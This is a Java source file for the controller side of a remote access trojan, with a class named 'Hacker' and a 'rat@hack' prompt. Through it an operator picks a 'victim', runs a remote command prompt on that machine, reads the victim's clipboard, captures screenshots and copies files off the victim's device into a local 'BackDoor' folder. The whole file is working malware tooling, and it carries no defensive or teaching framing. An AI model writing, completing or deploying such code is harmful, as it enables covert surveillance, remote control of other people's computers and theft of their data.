package server;

import server.model.Victim;

/*
nohup java -jar test.jar &
 */

import java.io.*;
import java.net.SocketException;
import java.util.Scanner;

public class Hacker  {

    private static final Scanner sc = new Scanner(System.in);
    private static Victim victim;
    private static String defaultDir;
    private CommandHandler cmdHandler;

    public static void main(String[] args)  {
        Hacker hacker = new Hacker();
        hacker.start();
    }

    public Hacker(){
        defaultDir = System.getProperty("user.home") + "/BackDoor/Data/";
    }

    public void start(){
        Connection c = null;
        try {
            c = new Connection();
            c.setDaemon(true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        c.start();

        cmdHandler =new CommandHandler(c);

        System.out.println("[vl]  Display victim list\n[cvn] Change current victim name\n[cmd] Handle victim's command prompt\n" +
                "[cb]  Get text currently copied to clipboard\n[ss]  Take screenshot\n[gf]  Get file from victim\n" +
                "[sf]  Send file to victim\n[ext] Exit");

        while (true){
            try {
                System.out.print("rat@hack:~$ ");
                String command = sc.nextLine().trim();

                if (command.equalsIgnoreCase("vl")) {
                    System.out.println("Victim list:");
                    if (cmdHandler.displayVictims() == 0) {
                        System.out.println("Victim list is empty!");
                    } else {
                        System.out.print("Select victim: ");
                        String v = sc.nextLine();
                        if (!v.matches("[\\d]+") || v.length() > 3) {
                            System.out.println("Invalid selection number");
                        } else {
                            int p = Integer.parseInt(v);
                            victim = cmdHandler.getVictim(p);
                            if (victim != null) {
                                System.out.println("Selected victim : " + victim.getName());
                            } else {
                                System.out.println("Invalid victim selection");
                            }
                        }
                    }

                } else if (command.equalsIgnoreCase("cvn") && victim != null) {
                    System.out.print("Enter name: ");
                    String name = sc.nextLine().trim();
                    if (name.length() == 0) {
                        System.out.println("Invalid name!");
                    } else {
                        victim.setName(name);
                    }
                } else if (command.equalsIgnoreCase("cmd") && victim != null) {
                    try {
                        cmdHandler.sendCommand(victim, command);
                        String cmd = "";
                        do {
                            String feedBack = cmdHandler.getFeedBackFrom(victim);
                            System.out.print(feedBack);
                            cmd = sc.nextLine();
                            cmdHandler.sendCommand(victim, cmd);
                        }while (!cmd.equalsIgnoreCase("exit"));
                    }catch (SocketException e){
                        this.victimDisconnected();
                    }catch (IOException e){
                        System.err.println("Can't control command prompt, Ex: " + e.toString());
                    }

                } else if (command.equalsIgnoreCase("cb") && victim != null) {
                    try {
                        cmdHandler.sendCommand(victim, command);
                        String clipboardTest = cmdHandler.getFeedBackFrom(victim);
                        System.out.println(clipboardTest);
                    }catch (SocketException e){
                        this.victimDisconnected();
                    }catch (IOException e) {
                        System.out.println("Don't find any copied text!");
                    }
                } else if (command.equalsIgnoreCase("ss") && victim != null) {
                    try {
                        String name = "screenshot_" + System.currentTimeMillis() + ".png";
                        String fileNameWithPath = defaultDir + name;
                        Thread t = new Thread(() -> {
                            try {
                                FTP.receiveScreenshot(fileNameWithPath);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        });
                        t.start();
                        Thread.sleep(100);
                        cmdHandler.sendCommand(victim, command);
                        System.out.println("Screenshot save to " + fileNameWithPath);
                    } catch (SocketException e){
                        this.victimDisconnected();
                    } catch (IOException  e) {
                        System.err.println("Can't take screenshot, Ex: " + e.toString());
                    }
                } else if (command.equalsIgnoreCase("gf") && victim != null) {
                    String fileNameWithPath = "";
                    try {
                        cmdHandler.sendCommand(victim, command);
                        System.out.print("Enter file path with name at victim's device: ");
                        fileNameWithPath = sc.nextLine();
                        System.out.print("Enter file name for save your device: ");
                        String fileName = sc.nextLine();
                        Thread t = new Thread(() -> {
                            try {
                                FTP.receiveFile(new File(defaultDir + File.separator + fileName));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        });
                        t.start();
                        Thread.sleep(100);
                        cmdHandler.sendCommand(victim, fileNameWithPath);
                        //cmdHandler.saveFile(victim, defaultDir + File.separator + fileName);
                        System.out.println("File save to '" + defaultDir + "' with name: '" + fileName + "'");
                    } catch (SocketException e){
                        this.victimDisconnected();
                    } catch (IOException e) {
                        System.out.println("Can't read file from: " + fileNameWithPath);
                    }
                } else if (command.equalsIgnoreCase("ext")) {
                    break;
                } else if (victim == null) {
                    System.out.println("Please select victim at first");
                } else {
                    System.out.println("Command not found");
                }

            }catch (Exception e){
                if(e instanceof SocketException){
                    this.victimDisconnected();
                }else{
                    System.out.println("Unexpected problem arise, Ex : " + e.toString());
                }
            }
        }
        // ServerSocket serverSocket = new ServerSocket(7777);
    }

    public void createDir(){
        File file = new File(defaultDir);
        file.mkdirs();
    }


    public void victimDisconnected(){
        System.out.println("Victim '"+victim.getName()+"' disconnected.");
        cmdHandler.removeVictim(victim);
        victim = null;
    }

}
